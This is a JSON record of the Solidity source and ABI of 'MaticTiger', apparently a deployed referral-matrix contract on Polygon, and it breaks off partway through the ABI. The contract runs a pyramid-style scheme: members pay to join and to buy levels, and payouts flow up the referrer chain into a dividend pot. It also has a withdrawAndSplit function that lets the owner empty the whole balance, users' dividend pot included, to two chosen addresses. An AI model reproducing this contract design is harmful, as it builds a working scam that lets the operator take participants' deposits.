{"SourceCode": "pragma solidity >=0.4.23 <0.6.0;\r\n\r\ncontract MaticTiger {\r\n    \r\n    struct User {\r\n        uint id;\r\n        address referrer;\r\n        uint partnersCount;\r\n        \r\n        mapping(uint8 => bool) activeX3Levels;\r\n        mapping(uint8 => bool) activeX6Levels;\r\n        \r\n        mapping(uint8 => X3) x3Matrix;\r\n        mapping(uint8 => X6) x6Matrix;\r\n        \r\n        mapping(uint8 => uint) x3MatrixEarnings;\r\n        mapping(uint8 => uint) x6MatrixEarnings;\r\n\r\n        uint divClaimMark;\r\n        uint totalPlayerDivPoints;\r\n        uint divsClaimed; \r\n    }\r\n    \r\n    struct X3 {\r\n        address currentReferrer;\r\n        address[] referrals;\r\n        bool blocked;\r\n        uint reinvestCount;\r\n    }\r\n    \r\n    struct X6 {\r\n        address currentReferrer;\r\n        address[] firstLevelReferrals;\r\n        address[] secondLevelReferrals;\r\n        bool blocked;\r\n        uint reinvestCount;\r\n\r\n        address closedPart;\r\n    }\r\n\r\n    uint8 public constant LAST_LEVEL = 12;\r\n    uint8 public constant DIV_PERCENT = 200; // == 20.00%\r\n    uint16 internal constant DIV_DIVISOR = 10000;\r\n\r\n    mapping(address => User) public users;\r\n    mapping(uint => address) public idToAddress;\r\n\r\n    bool public gameOpen = true;\r\n    \r\n    uint public divPot; \r\n    uint public totalDividendPoints;\r\n    uint public totalDivs;\r\n    uint internal calcDivs; \r\n    \r\n    uint constant pointMultiplier = 1e18;\r\n    \r\n    uint public lastUserId = 2;\r\n    address public owner;\r\n    address internal admin;\r\n    \r\n    mapping(uint8 => uint) public levelPrice;\r\n    \r\n    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);\r\n    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);\r\n    event Upgrade(address indexed user, address indexed referrer, uint8 matrix, uint8 level);\r\n    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);\r\n    event MissedEthReceive(address indexed receiver, address indexed from, uint8 matrix, uint8 level);\r\n    event SentExtraEthDividends(address indexed from, address indexed receiver, uint8 matrix, uint8 level);\r\n    \r\n        constructor(address ownerAddress) public {\r\n        admin = msg.sender;\r\n        levelPrice[1] = 1000000000000000000; // 1 MATIC per level  \r\n        for (uint8 i = 2; i <= LAST_LEVEL; i++) {\r\n            levelPrice[i] = levelPrice[i-1] * 2;\r\n        }\r\n        \r\n        owner = ownerAddress;\r\n        \r\n        User memory user = User({\r\n            id: 1,\r\n            referrer: address(0),\r\n            partnersCount: uint(0),\r\n            divClaimMark: 0,\r\n            totalPlayerDivPoints: 0,\r\n            divsClaimed: 0\r\n        });\r\n        \r\n        users[ownerAddress] = user;\r\n        idToAddress[1] = ownerAddress;\r\n        \r\n        for (uint8 i = 1; i <= LAST_LEVEL; i++) {\r\n            users[ownerAddress].activeX3Levels[i] = true;\r\n            users[ownerAddress].activeX6Levels[i] = true;\r\n        }\r\n\r\n    }\r\n    \r\n    function updateGameOpen(bool _gameOpen) public {\r\n        require(msg.sender == admin, \"Only Admin\");\r\n        gameOpen = _gameOpen;\r\n    }\r\n    \r\n    function() external payable {\r\n        if(msg.data.length == 0) {\r\n            return registration(msg.sender, owner);\r\n        }\r\n        \r\n        registration(msg.sender, bytesToAddress(msg.data));\r\n    }\r\n\r\n    function registrationExt(address referrerAddress) external payable {\r\n        require(gameOpen == true, \"Game not yet open!\");\r\n        registration(msg.sender, referrerAddress);\r\n    }\r\n    \r\n    function buyNewLevel(uint8 matrix, uint8 level) external payable {\r\n        require(gameOpen == true, \"Game not yet open!\");\r\n        require(isUserExists(msg.sender), \"user is not exists. Register first.\");\r\n        require(matrix == 1 || matrix == 2, \"invalid matrix\");\r\n        require(msg.value == levelPrice[level], \"invalid price\");\r\n        require(level > 1 && level <= LAST_LEVEL, \"invalid level\");\r\n\r\n        if(viewDivs(msg.sender) > 0){\r\n            sendDivs(msg.sender);\r\n        } else {\r\n            users[msg.sender].divClaimMark = totalDividendPoints;\r\n        }\r\n\r\n        users[msg.sender].totalPlayerDivPoints += msg.value * DIV_PERCENT / DIV_DIVISOR;\r\n\r\n        divPot += (msg.value * DIV_PERCENT / DIV_DIVISOR);\r\n        totalDivs += (msg.value * DIV_PERCENT / DIV_DIVISOR);\r\n\r\n        if (matrix == 1) {\r\n            require(!users[msg.sender].activeX3Levels[level], \"level already activated\");\r\n\r\n            if (users[msg.sender].x3Matrix[level-1].blocked) {\r\n                users[msg.sender].x3Matrix[level-1].blocked = false;\r\n            }\r\n    \r\n            address freeX3Referrer = findFreeX3Referrer(msg.sender, level);\r\n\r\n            // Short-circuits to save Energy\r\n            if(freeX3Referrer == owner){\r\n                if(viewDivs(owner) > 0){\r\n                    sendDivs(owner);\r\n                } else {\r\n                    users[owner].divClaimMark = totalDividendPoints;\r\n                }\r\n\r\n                users[owner].totalPlayerDivPoints += msg.value * DIV_PERCENT / DIV_DIVISOR;\r\n                calcDivs += msg.value * DIV_PERCENT / DIV_DIVISOR * 2;\r\n                totalDividendPoints += (msg.value * DIV_PERCENT / DIV_DIVISOR) * pointMultiplier / calcDivs;\r\n            } else {\r\n                calcDivs += (msg.value * DIV_PERCENT / DIV_DIVISOR);\r\n                totalDividendPoints += (msg.value * DIV_PERCENT / DIV_DIVISOR) * pointMultiplier / calcDivs;\r\n            }\r\n\r\n            users[msg.sender].x3Matrix[level].currentReferrer = freeX3Referrer;\r\n            users[msg.sender].activeX3Levels[level] = true;\r\n            updateX3Referrer(msg.sender, freeX3Referrer, level);\r\n            \r\n            emit Upgrade(msg.sender, freeX3Referrer, 1, level);\r\n\r\n        } else {\r\n            require(!users[msg.sender].activeX6Levels[level], \"level already activated\"); \r\n\r\n            if (users[msg.sender].x6Matrix[level-1].blocked) {\r\n                users[msg.sender].x6Matrix[level-1].blocked = false;\r\n            }\r\n\r\n            address freeX6Referrer = findFreeX6Referrer(msg.sender, level);\r\n\r\n            // Short-circuits to save Energy\r\n            if(freeX6Referrer == owner){\r\n                if(viewDivs(owner) > 0){\r\n                    sendDivs(owner);\r\n                } else {\r\n                    users[owner].divClaimMark = totalDividendPoints;\r\n                }\r\n\r\n                users[owner].totalPlayerDivPoints += msg.value * DIV_PERCENT / DIV_DIVISOR;\r\n                calcDivs += msg.value * DIV_PERCENT / DIV_DIVISOR * 2;\r\n                totalDividendPoints += (msg.value * DIV_PERCENT / DIV_DIVISOR) * pointMultiplier / calcDivs;\r\n            } else {\r\n                calcDivs += (msg.value * DIV_PERCENT / DIV_DIVISOR);\r\n                totalDividendPoints += (msg.value * DIV_PERCENT / DIV_DIVISOR) * pointMultiplier / calcDivs;\r\n            }\r\n            \r\n            users[msg.sender].activeX6Levels[level] = true;\r\n            updateX6Referrer(msg.sender, freeX6Referrer, level);\r\n            \r\n            emit Upgrade(msg.sender, freeX6Referrer, 2, level);\r\n        }\r\n    }    \r\n    \r\n    function registration(address userAddress, address referrerAddress) private {\r\n        require(msg.value == 2000000000000000000, \"registration cost 2 MATIC\");\r\n                \r\n        require(!isUserExists(userAddress), \"user exists\");\r\n\r\n        require(isUserExists(referrerAddress), \"referrer not exists\");\r\n\r\n        uint32 size;\r\n        assembly {\r\n            size := extcodesize(userAddress)\r\n        }\r\n        require(size == 0, \"cannot be a contract\");\r\n\r\n        User memory user = User({\r\n            id: lastUserId,\r\n            referrer: referrerAddress,\r\n            partnersCount: 0,\r\n            divClaimMark: totalDividendPoints,\r\n            totalPlayerDivPoints: 0,\r\n            divsClaimed: 0\r\n            \r\n        });\r\n        \r\n        users[userAddress] = user;\r\n        idToAddress[lastUserId] = userAddress;\r\n        \r\n        users[userAddress].referrer = referrerAddress;\r\n        \r\n        users[userAddress].activeX3Levels[1] = true; \r\n        users[userAddress].activeX6Levels[1] = true;\r\n        \r\n        users[userAddress].totalPlayerDivPoints += (msg.value * DIV_PERCENT / DIV_DIVISOR);\r\n\r\n\r\n        divPot += msg.value * DIV_PERCENT / DIV_DIVISOR;\r\n        totalDivs += (msg.value * DIV_PERCENT / DIV_DIVISOR);\r\n                 \r\n        lastUserId++;\r\n        \r\n        users[referrerAddress].partnersCount++;\r\n\r\n        address freeX3Referrer = findFreeX3Referrer(userAddress, 1);\r\n        address freeX6Ref = findFreeX6Referrer(userAddress, 1);\r\n\r\n        // Short-circuits to save Energy\r\n        if(freeX3Referrer == owner || freeX6Ref == owner){\r\n            if(viewDivs(owner) > 0){\r\n                sendDivs(owner);\r\n            } else {\r\n                users[owner].divClaimMark = totalDividendPoints;\r\n            }\r\n\r\n            users[owner].totalPlayerDivPoints += msg.value * DIV_PERCENT / DIV_DIVISOR;\r\n            calcDivs += msg.value * DIV_PERCENT / DIV_DIVISOR * 2;\r\n            totalDividendPoints += (msg.value * DIV_PERCENT / DIV_DIVISOR) * pointMultiplier / calcDivs;\r\n        } else {\r\n            calcDivs += (msg.value * DIV_PERCENT / DIV_DIVISOR);\r\n            totalDividendPoints += (msg.value * DIV_PERCENT / DIV_DIVISOR) * pointMultiplier / calcDivs;\r\n        }\r\n\r\n        users[userAddress].x3Matrix[1].currentReferrer = freeX3Referrer;\r\n        updateX3Referrer(userAddress, freeX3Referrer, 1);\r\n\r\n        updateX6Referrer(userAddress, freeX6Ref, 1);\r\n\r\n        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);\r\n    }\r\n        \r\n    function claimDivs() public returns(bool) {\r\n        uint _divAmount = viewDivs(msg.sender);\r\n        require(_divAmount > 0, \"No divs available\");\r\n        sendDivs(msg.sender);\r\n    }\r\n\r\n    function sendDivs(address _user) internal returns(bool) {\r\n        uint _divAmount = viewDivs(_user);\r\n        divPot -= _divAmount;\r\n        users[_user].divClaimMark = totalDividendPoints;\r\n        users[_user].divsClaimed += _divAmount;\r\n        \r\n        return address(uint160(_user)).send(_divAmount);    \r\n    }\r\n\r\n    function viewDivsPercent(address _player) public view returns(uint divsPercent) {\r\n        return  users[_player].totalPlayerDivPoints * 100 / calcDivs;\r\n    }\r\n\r\n    function viewDivs(address _player) public view returns(uint divsAvailable) {\r\n        uint newDividendPoints = totalDividendPoints - users[_player].divClaimMark;\r\n        return (users[_player].totalPlayerDivPoints * newDividendPoints) / pointMultiplier;\r\n    }\r\n\r\n    function updateX3Referrer(address userAddress, address referrerAddress, uint8 level) private {\r\n        users[referrerAddress].x3Matrix[level].referrals.push(userAddress);\r\n\r\n        if (users[referrerAddress].x3Matrix[level].referrals.length < 3) {\r\n            emit NewUserPlace(userAddress, referrerAddress, 1, level, uint8(users[referrerAddress].x3Matrix[level].referrals.length));\r\n            return sendPartnerTRX(referrerAddress, userAddress, 1, level);\r\n        }\r\n        \r\n        emit NewUserPlace(userAddress, referrerAddress, 1, level, 3);\r\n        users[referrerAddress].x3Matrix[level].referrals = new address[](0);\r\n        if (!users[referrerAddress].activeX3Levels[level+1] && level != LAST_LEVEL) {\r\n            users[referrerAddress].x3Matrix[level].blocked = true;\r\n        }\r\n\r\n        // Short-circuits to save Energy\r\n        if (referrerAddress != owner) {\r\n            address freeReferrerAddress = findFreeX3Referrer(referrerAddress, level);\r\n            if (users[referrerAddress].x3Matrix[level].currentReferrer != freeReferrerAddress) {\r\n                users[referrerAddress].x3Matrix[level].currentReferrer = freeReferrerAddress;\r\n            }\r\n            \r\n            users[referrerAddress].x3Matrix[level].reinvestCount++;\r\n            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 1, level);\r\n            updateX3Referrer(referrerAddress, freeReferrerAddress, level);\r\n        } else {\r\n            sendPartnerTRX(owner, userAddress, 1, level);\r\n            users[owner].x3Matrix[level].reinvestCount++;\r\n            emit Reinvest(owner, address(0), userAddress, 1, level);\r\n        }\r\n    }\r\n\r\n    function updateX6Referrer(address userAddress, address referrerAddress, uint8 level) private {\r\n\r\n        require(users[referrerAddress].activeX6Levels[level], \"500. Referrer level is inactive\");\r\n\r\n        if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length < 2) { \r\n            users[referrerAddress].x6Matrix[level].firstLevelReferrals.push(userAddress); \r\n            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].firstLevelReferrals.length));\r\n            \r\n            users[userAddress].x6Matrix[level].currentReferrer = referrerAddress; \r\n\r\n            // Short-circuits to save Energy\r\n            if (referrerAddress == owner) {\r\n                return sendPartnerTRX(referrerAddress, userAddress, 2, level);\r\n            }\r\n            \r\n            address ref = users[referrerAddress].x6Matrix[level].currentReferrer;        \r\n            users[ref].x6Matrix[level].secondLevelReferrals.push(userAddress);  \r\n            \r\n            uint len = users[ref].x6Matrix[level].firstLevelReferrals.length; \r\n            \r\n            if ((len == 2) && \r\n                (users[ref].x6Matrix[level].firstLevelReferrals[0] == referrerAddress) &&\r\n                (users[ref].x6Matrix[level].firstLevelReferrals[1] == referrerAddress)) {\r\n                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {\r\n                    emit NewUserPlace(userAddress, ref, 2, level, 5);\r\n                } else {\r\n                    emit NewUserPlace(userAddress, ref, 2, level, 6);\r\n                }\r\n            }  else if ((len == 1 || len == 2) &&\r\n                    users[ref].x6Matrix[level].firstLevelReferrals[0] == referrerAddress) {\r\n                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {\r\n                    emit NewUserPlace(userAddress, ref, 2, level, 3);\r\n                } else {\r\n                    emit NewUserPlace(userAddress, ref, 2, level, 4);\r\n                }\r\n            } else if (len == 2 && users[ref].x6Matrix[level].firstLevelReferrals[1] == referrerAddress) {\r\n                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {\r\n                    emit NewUserPlace(userAddress, ref, 2, level, 5);\r\n                } else {\r\n                    emit NewUserPlace(userAddress, ref, 2, level, 6); \r\n                }\r\n            }\r\n            \r\n            return updateX6ReferrerSecondLevel(userAddress, ref, level);\r\n        }\r\n        \r\n        users[referrerAddress].x6Matrix[level].secondLevelReferrals.push(userAddress);\r\n\r\n        if (users[referrerAddress].x6Matrix[level].closedPart != address(0)) {\r\n            if ((users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == \r\n                users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]) &&\r\n                (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] ==\r\n                users[referrerAddress].x6Matrix[level].closedPart)) {\r\n\r\n                updateX6(userAddress, referrerAddress, level, true);\r\n                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);\r\n            } else if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == \r\n                users[referrerAddress].x6Matrix[level].closedPart) {\r\n                updateX6(userAddress, referrerAddress, level, true);\r\n                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);\r\n            } else {\r\n                updateX6(userAddress, referrerAddress, level, false);\r\n                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);\r\n            }\r\n        }\r\n\r\n        if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[1] == userAddress) {\r\n            updateX6(userAddress, referrerAddress, level, false);\r\n            return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);\r\n        } else if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == userAddress) {\r\n            updateX6(userAddress, referrerAddress, level, true);\r\n            return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);\r\n        }\r\n        \r\n        if (users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length <= \r\n            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length) {\r\n            updateX6(userAddress, referrerAddress, level, false);\r\n        } else {\r\n            updateX6(userAddress, referrerAddress, level, true);\r\n        }\r\n        \r\n        updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);\r\n    }\r\n\r\n    function updateX6(address userAddress, address referrerAddress, uint8 level, bool x2) private {\r\n        if (!x2) {\r\n            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.push(userAddress);\r\n            emit NewUserPlace(userAddress, users[referrerAddress].x6Matrix[level].firstLevelReferrals[0], 2, level, uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length));\r\n            emit NewUserPlace(userAddress, referrerAddress, 2, level, 2 + uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length));\r\n            \r\n            users[userAddress].x6Matrix[level].currentReferrer = users[referrerAddress].x6Matrix[level].firstLevelReferrals[0];\r\n        } else {\r\n            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.push(userAddress);\r\n            emit NewUserPlace(userAddress, users[referrerAddress].x6Matrix[level].firstLevelReferrals[1], 2, level, uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length));\r\n            emit NewUserPlace(userAddress, referrerAddress, 2, level, 4 + uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length));\r\n            \r\n            users[userAddress].x6Matrix[level].currentReferrer = users[referrerAddress].x6Matrix[level].firstLevelReferrals[1];\r\n        }\r\n    }\r\n    \r\n    function updateX6ReferrerSecondLevel(address userAddress, address referrerAddress, uint8 level) private {\r\n        if (users[referrerAddress].x6Matrix[level].secondLevelReferrals.length < 4) {\r\n            \r\n            return sendPartnerTRX(referrerAddress, userAddress, 2, level);\r\n        }\r\n        \r\n        address[] memory x6 = users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].firstLevelReferrals;\r\n        \r\n        if (x6.length == 2) {\r\n            if (x6[0] == referrerAddress ||\r\n                x6[1] == referrerAddress) {\r\n                users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].closedPart = referrerAddress;\r\n            } else if (x6.length == 1) {\r\n                if (x6[0] == referrerAddress) {\r\n                    users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].closedPart = referrerAddress;\r\n                }\r\n            }\r\n        }\r\n        \r\n        users[referrerAddress].x6Matrix[level].firstLevelReferrals = new address[](0);\r\n        users[referrerAddress].x6Matrix[level].secondLevelReferrals = new address[](0);\r\n        users[referrerAddress].x6Matrix[level].closedPart = address(0);\r\n\r\n        if (!users[referrerAddress].activeX6Levels[level+1] && level != LAST_LEVEL) {\r\n            users[referrerAddress].x6Matrix[level].blocked = true;\r\n        }\r\n\r\n        users[referrerAddress].x6Matrix[level].reinvestCount++;\r\n        \r\n        // Short-circuits to save Energy\r\n        if (referrerAddress != owner) {\r\n            address freeReferrerAddress = findFreeX6Referrer(referrerAddress, level);\r\n\r\n            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 2, level);\r\n            updateX6Referrer(referrerAddress, freeReferrerAddress, level);\r\n        } else {\r\n            emit Reinvest(owner, address(0), userAddress, 2, level);\r\n            sendPartnerTRX(owner, userAddress, 2, level);\r\n        }\r\n    }\r\n    \r\n    function findFreeX3Referrer(address userAddress, uint8 level) public view returns(address) {\r\n        while (true) {\r\n            if (users[users[userAddress].referrer].activeX3Levels[level]) {\r\n                return users[userAddress].referrer;\r\n            }\r\n            \r\n            userAddress = users[userAddress].referrer;\r\n        }\r\n    }\r\n    \r\n    function findFreeX6Referrer(address userAddress, uint8 level) public view returns(address) {\r\n        while (true) {\r\n            if (users[users[userAddress].referrer].activeX6Levels[level]) {\r\n                return users[userAddress].referrer;\r\n            }\r\n            \r\n            userAddress = users[userAddress].referrer;\r\n        }\r\n    }\r\n\r\n    function usersActiveLevelsAll(address userAddress) public view returns(bool[13] memory x3LevelsActive, bool[13] memory x6LevelsActive) {\r\n        for(uint8 c=1; c< 13; c++){\r\n            x3LevelsActive[c] = users[userAddress].activeX3Levels[c];\r\n            x6LevelsActive[c] = users[userAddress].activeX6Levels[c];\r\n        }\r\n    }\r\n    \r\n    function usersHighestLevels(address userAddress) public view returns(uint8 x3HighestLevel, uint8 x6HighestLevel) {\r\n        for(uint8 c=1; c< 13; c++){\r\n            if(users[userAddress].activeX3Levels[c])\r\n                x3HighestLevel = c;\r\n                \r\n            if(users[userAddress].activeX6Levels[c])\r\n                x6HighestLevel = c;\r\n        }     \r\n    }\r\n\r\n    function usersActiveX6Levels(address userAddress, uint8 level) public view returns(bool) {\r\n        return users[userAddress].activeX6Levels[level];\r\n    }\r\n\r\n    function userEarnings(address userAddress, uint8 level) public view returns(uint x3MatrixEarnings, uint x6MatrixEarnings) {\r\n        x3MatrixEarnings = users[userAddress].x3MatrixEarnings[level];\r\n        x6MatrixEarnings = users[userAddress].x6MatrixEarnings[level];\r\n    }\r\n\r\n    function userEarningsAll(address userAddress) public view returns(uint[13] memory x3MatrixEarnings, uint[13] memory x6MatrixEarnings){\r\n    \r\n        for(uint8 c=1; c< 13; c++){\r\n            x3MatrixEarnings[c] = users[userAddress].x3MatrixEarnings[c];\r\n            x6MatrixEarnings[c] = users[userAddress].x6MatrixEarnings[c];\r\n        }\r\n    }\r\n\r\n    function usersX3Matrix(address userAddress, uint8 level) public view returns(address, address[] memory, bool) {\r\n        return (users[userAddress].x3Matrix[level].currentReferrer,\r\n                users[userAddress].x3Matrix[level].referrals,\r\n                users[userAddress].x3Matrix[level].blocked);\r\n    }\r\n\r\n\r\n    function usersX6Matrix(address userAddress, uint8 level) public view returns(address, address[] memory, address[] memory, bool, address) {\r\n        return (users[userAddress].x6Matrix[level].currentReferrer,\r\n                users[userAddress].x6Matrix[level].firstLevelReferrals,\r\n                users[userAddress].x6Matrix[level].secondLevelReferrals,\r\n                users[userAddress].x6Matrix[level].blocked,\r\n                users[userAddress].x6Matrix[level].closedPart);\r\n    }\r\n    \r\n    function isUserExists(address user) public view returns (bool) {\r\n        return (users[user].id != 0);\r\n    }\r\n\r\n    function findTRXReceiver(address userAddress, address _from, uint8 matrix, uint8 level) private returns(address, bool) {\r\n        address receiver = userAddress;\r\n        bool isExtraDividends;\r\n        if (matrix == 1) {\r\n            while (true) {\r\n                if (users[receiver].x3Matrix[level].blocked) {\r\n                    emit MissedEthReceive(receiver, _from, 1, level);\r\n                    isExtraDividends = true;\r\n                    receiver = users[receiver].x3Matrix[level].currentReferrer;\r\n                } else {\r\n                    return (receiver, isExtraDividends);\r\n                }\r\n            }\r\n        } else {\r\n            while (true) {\r\n                if (users[receiver].x6Matrix[level].blocked) {\r\n                    emit MissedEthReceive(receiver, _from, 2, level);\r\n                    isExtraDividends = true;\r\n                    receiver = users[receiver].x6Matrix[level].currentReferrer;\r\n                } else {\r\n                    return (receiver, isExtraDividends);\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    // Sends matic earnings direct to parent (P2P)\r\n    function sendPartnerTRX(address userAddress, address _from, uint8 matrix, uint8 level) private {\r\n\r\n        (address receiver, bool isExtraDividends) = findTRXReceiver(userAddress, _from, matrix, level);\r\n        \r\n        address(uint160(receiver)).transfer(\r\n            levelPrice[level] - (levelPrice[level] * DIV_PERCENT / DIV_DIVISOR)\r\n        );\r\n\r\n        if(matrix == 1)\r\n            users[receiver].x3MatrixEarnings[level] += levelPrice[level] - (levelPrice[level] * DIV_PERCENT / DIV_DIVISOR);\r\n        else\r\n            users[receiver].x6MatrixEarnings[level] += levelPrice[level] - (levelPrice[level] * DIV_PERCENT / DIV_DIVISOR);\r\n        \r\n        if (isExtraDividends) {\r\n            emit SentExtraEthDividends(_from, receiver, matrix, level);\r\n        }\r\n    }\r\n    \r\n    function withdrawAndSplit(address payable recipient1, address payable recipient2) external {\r\n        require(msg.sender == owner, \"Only the owner can withdraw the balance.\");\r\n        \r\n        uint256 balance = address(this).balance;\r\n        require(balance > 0, \"No balance to withdraw.\");\r\n        \r\n        uint256 amountToSend = balance / 2;\r\n        \r\n        require(amountToSend > 0, \"Balance too low to split.\");\r\n        \r\n        recipient1.transfer(amountToSend);\r\n        recipient2.transfer(amountToSend);\r\n    }\r\n    \r\n   \r\n    function bytesToAddress(bytes memory bys) private pure returns (address addr) {\r\n        assembly {\r\n            addr := mload(add(bys, 20))\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ownerAddress\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"matrix\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"MissedEthReceive\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"matrix\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"place\",\"type\":\"uint8\"}],\"name\":\"NewUserPlace\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"userId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"referrerId\",\"type\":\"uint256\"}],\"name\":\"Registration\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"currentReferrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"caller\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"matrix\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Reinvest\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"matrix\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"SentExtraEthDividends\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"matrix\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Upgrade\",\"type\":\"event\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":true,\"inputs\":[],\"name\":\"DIV_PERCENT\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"LAST_LEVEL\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"matrix\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"buyNewLevel\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"claimDivs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"divPot\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"findFreeX3Referrer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"findFreeX6Referrer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"gameOpen\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"idToAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"t